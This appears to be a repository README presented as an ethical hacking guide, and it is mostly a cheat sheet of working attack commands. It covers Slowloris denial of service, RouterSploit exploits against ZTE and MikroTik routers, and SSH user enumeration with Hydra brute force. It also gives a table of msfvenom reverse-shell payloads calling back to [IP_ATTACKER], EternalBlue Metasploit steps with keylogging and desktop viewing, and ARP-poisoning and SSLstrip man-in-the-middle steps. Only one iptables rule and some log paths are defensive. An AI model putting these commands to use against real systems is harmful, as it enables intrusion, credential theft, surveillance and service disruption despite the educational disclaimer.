# The content and practices described herein are intended solely for educational and informational purposes. Ethical hacking, also known as penetration testing, should only be performed with explicit, written consent from the owners of the systems, networks, or applications being tested. Failure to adhere to these principles may result in legal action and consequences. Always prioritize ethical standards and the security of information.

## What is Ethical Hacking ?
Ethical hacking, often referred to as penetration testing or white-hat hacking, involves the practice of intentionally probing systems, networks, or applications to identify and fix vulnerabilities before malicious hackers can exploit them.\
Here are some key points:\
1. Purpose: The primary goal is to enhance security by uncovering weaknesses in systems.\
Legal and Authorized: Ethical hackers operate with permission from the organization they are testing, distinguishing them from malicious hackers.\
2. Techniques: They use various methods such as social engineering, network scanning, and vulnerability assessments to identify potential risks.\
3. Tools: Common tools include Nmap, Metasploit, Burp Suite, and Wireshark, among others.\
4. Certification: Many ethical hackers pursue certifications like Certified Ethical Hacker (CEH) or Offensive Security Certified Professional (OSCP) to validate their skills.\
5. Report Findings: After testing, ethical hackers provide detailed reports to organizations, outlining vulnerabilities and recommendations for improvement.\
Ethical hacking is a critical component of cybersecurity, helping to safeguard data and maintain trust in digital systems.

# Summary Of Repository

# OSI Layer
## What is OSI Layer?

## Table OSI Layer
OSI Model
| No | Layer | Example |
| --- | --- | --- |
| 7 | Application | HTTP, FTP, SMTP |
| 6 | Presentation | HTTPS, SSL, TLS |
| 5 | Session | NetBIOS, PPTP |
| 4 | Transport | TCP, UDP |
| 3 | Network | Router, IP, ICMP |
| 2 | Data Link | Ethernet, Switch |
| 1 | Physical | Hub, NIC, Cable |

# Denial Of Service Web
## Slowloris (GET Attack)
Slowloris Perl
```
perl slowloris.pl -dns [IP_TARGET] -port 80 -timeout 200 -num 5000 -cache
```
Slowloris Python. Source : (https://github.com/gkbrk/slowloris)
```
git clone https://github.com/gkbrk/slowloris.git
cd slowloris
python3 slowloris.py [IP_TARGET] --port 80 --sleeptime 1000
```

## Anonymousdoser (POST Attack)
```
Website [URL/IP] : [IP_TARGET]
Time [Seconds] : 9999
```
## Log
Log Apache and Nginx
```
/var/log/apache2/access.log
/var/log/nginx/access.log
```
Optional (Live Report)
```
tail -f ./access.log
```
## Harderning
IP Tables
```
iptables -I INPUT -p tcp --dport 80 -m connlimit --connlimit-above 20 --connlimit-mask 40 -j DROP
```

# Router Exploit
## Routersploit
Exploit For Router HGU, Mikrotik, IPCAM, etc.\
Source : https://github.com/threat9/routersploit\
Case Router ZTE_F609 and ZTE_F660
```
show exploits
search zte
use exploits/routers/zte/f609_config_disclosure
use exploits/routers/zte/f660_config_disclosure
show options
set target [IP_TARGET]
exploit
```
Case Router MikroTik 6.29 < 6.42 (Port 8291)
```
search mikrotik
use exploits/routers/mikrotik/winbox_auth_bypass_creds_disclosure
show options
set target [IP_TARGET]
exploit
```

# Scanning Port and Service
## NMAP
```
nmap -sn [RANGE_IP]
nmap -A [IP_TARGET]
```
## Netdiscovery
```
netdiscovery
```
## Nbtscan
```
nbtscan [NETWORK_IP]
```

# Brute Force
## Hydra
CVE-2018-15473 (OpenSSH 2.3 < 7.7)\
Source : https://www.exploit-db.com/exploits/45233\
Run Exploit
```
python3 45233.py --userList user.txt [IP_TARGET] --outputFile hasil.txt
hydra -L user.txt -P pass.txt [IP_TARGET] ssh
```

# Reverse Shell
## Payload Msvenom
Payload Reverse Shell
| Target | Example |
| --- | --- |
| Android | msfvenom -p android/meterpreter/reverse_tcp LHOST=[IP_ATTACKER] LPORT=[PORT_ATTACKER] R > payload.apk |
| Windows Staged | msfvenom -p windows/meterpreter/reverse_tcp LHOST=[IP_ATTACKER] LPORT=[PORT_ATTACKER] -f exe > reverse.exe |
| Windows Stageless | msfvenom -p windows/shell_reverse_tcp LHOST=[IP_ATTACKER] LPORT=[PORT_ATTACKER] -f exe > reverse.exe |
| Linux | msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[IP_ATTACKER] LPORT=[PORT_ATTACKER] -f elf >reverse.elf |
| OSX | msfvenom -p osx/x86/shell_reverse_tcp LHOST=[IP_ATTACKER] LPORT=[PORT_ATTACKER] -f macho > shell.macho |
| Python | msfvenom -p cmd/unix/reverse_python LHOST=[IP_ATTACKER] LPORT=[PORT_ATTACKER] -f raw > shell.py |
| PHP | msfvenom -p php/meterpreter_reverse_tcp LHOST=[IP_ATTACKER] LPORT=[PORT_ATTACKER] -f raw > shell.php; cat shell.php \| pbcopy && echo '<?php ' \| tr -d '\n' > shell.php && pbpaste >> shell.php |
| Bash | msfvenom -p cmd/unix/reverse_bash LHOST=[IP_ATTACKER] LPORT=[PORT_ATTACKER] -f raw > shell.sh |

## Hacking SMB With Metasploit
Windows 7
```
msfconsole -q
search ms17_010_ethernalblue
use exploit [ms17_010_ethernalblue]
set payload windows/x64/meterpreter/reverse_tcp
set lport [PORT_ATTACKER]
set lhost [IP_ATTACKER]
set rhost [IP_TARGET]
exploit
```
Windows 10
```
msfconsole -q
use exploit windows/smb/eternalblue_doublepulsar
set payload windows/meterpreter/reverse_tcp
set lport [PORT_ATTACKER]
set lhost [IP_ATTACKER]
set rhost [IP_TARGET]
exploit
```
Access Shell Target
```
shell -> Access CMD Windows
```
View Desktop Target
```
run vnc -> View Dekstop Target
```
Keylogger Target
```
migrate exploler.exe
keyscan_start
keyscan_dump
```

# MITM (Man In The Middle)
## Ettercap
Ettercap GUI Example
```
run ettercap -G

Step 1.
> options
> enable promisc mode => ethernet mode
> disable promisc mode => wireless mode

Step 2.
> sniff
> unified sniffing
> network interface => eth0

Step 3.
> host
> hostlist
> add target 1 => [IP_ROUTER]
> add target 2 => [IP_TARGET]

Step 4.
> target
> enable current target

Step 5.
> plugins
> manage the plugins
> remote_browser

Step 6.
> mitm
> arp poisoning
> enable sniff remote connection
```

## SSL Strip (Downgrade HTTPS to HTTP)
Forwarding Port
```
echo 1> /proc/sys/net/ipv4/ip_forward
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to- port 10000
```
ARP Spoofing
```
arpspoof -i eth0 -t [IP_TARGET] -r [IP_ROUTER]
sslstrip -l 10000
```
Log SSL Strip
```
sslstrip.log
```

 
